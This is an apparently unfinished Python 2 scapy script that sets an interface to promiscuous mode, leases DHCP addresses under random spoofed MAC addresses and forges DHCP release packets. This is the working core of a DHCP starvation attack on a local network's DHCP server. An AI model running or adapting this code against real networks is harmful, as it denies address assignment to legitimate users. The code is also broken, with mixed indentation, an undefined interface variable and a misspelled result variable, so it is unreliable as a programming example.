import subprocess
import logging
import random 
import sys

#supress scapy warning messages
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
logging.getLogger("scapy.interactive").setLevel(logging.ERROR)
logging.getLogger("scapy.loading").setLevel(logging.ERROR)

#Module try/except block
try:
	from scapy.all import *

except ImportError:
	print"Scapy pacakge for python is not installed on your system."
	print"Get it from https://pypi.python.org/pypi/scapy and try again."
	sys.exit()


print" \n Make sure to run this program as ROOT! \n"

#Prompt for network interface
net_iface=raw_input("Enter the interface to the target network: ")

#Set the network into promiscuous mode
subprocess.call(["ifconfig",net_iface,"promisc"],stdout=None,stderr=None,shell=False)

print "\nInterface %s was set to PROMISC mode."%net_iface

#Disable scapy ip check 
conf.checkIPaddr=False

#DHCP SEQUENCE
all_given_leases=[]
server_id=[]
client_mac=[]


#generate dhcp sequence
def generate_dhcp_seq():
	global all_given_leases

	#Defining some DHCP parameters
	x_id=random.randrange(1,1000000)
	hw="00:00:5e"+str(RandMAC())[8:]
	hw_str=mac2str(hw)


    #Assigning the .command() output of a captured DHCP DISCOVER packet to a variable
    dhcp_dis_pkt = Ether(dst="ff:ff:ff:ff:ff:ff", src=hw)/IP(src="0.0.0.0",dst="255.255.255.255") / UDP(sport=68,dport=67)/BOOTP(op=1, xid=x_id, chaddr=hw_str)/DHCP(options=[("message-type","discover"),("end")])
    
    #Sending the DISCOVER packet and catching the OFFER reply
    #Generates two lists (answ and unansw). answd is a list containg a tuple: the first element is the DISCOVER packet, the second is the OFFER packet
    answd, unanswd = srp(dhcp_dis_pkt, iface=pkt_inf, timeout = 2.5, verbose=0)

    #Extract offered ip
    offered_ip=answd[0][1][BOOTP].yiaddr

     #Assigning the .command() output of a captured DHCP REQUEST packet to a variable
    dhcp_req_pkt = Ether(dst="ff:ff:ff:ff:ff:ff", src=hw)/IP(src="0.0.0.0",dst="255.255.255.255") / UDP(sport=68,dport=67)/BOOTP(op=1, xid=x_id, chaddr=hw_str)/DHCP(options=[("message-type","request"),("requested_addr", offered_ip),("end")])
    
    #Sending the REQUEST for the offered IP address
    #Capturing the ACK from the server
    answr, unanswr = srp(dhcp_req_pkt, iface=pkt_inf, timeout = 2.5, verbose=0)   

    #Extract offered ip (acknowledgment)
    offred_ip_ack=answdr[0][1][BOOTP].yiaddr

    #DHCP server IP/ID
    server_ip=answr[0][1][IP].src

    #Add each leased ip to list of leases
    all_given_leases.append(offred_ip_ack)

    #Add server ip to list
    server_id.append(server_ip)

    client_mac.append(hw)

    return all_given_leases,server_id,client_mac

#DHCP Release
def generate_dhcp_release(ip,hw,server):

	#Define DHCP Transaction ID
	x_id=random.randrange(1,1000000)
	hw_str=mac2str(hw)

	#Create the Release Packet
	dhcp_rls_pkt=IP(src=ip,dst=server)/UDP(sport=68,dport=67)/BOOTP(chaddr=hw_str,ciaddr=ip,xid=x_id)/DHCP(options=[("message-type","release"),("server_id",server),("end")])

	#Send the Release Packet
	send(dhcp_rls_pkt,verbose=0)

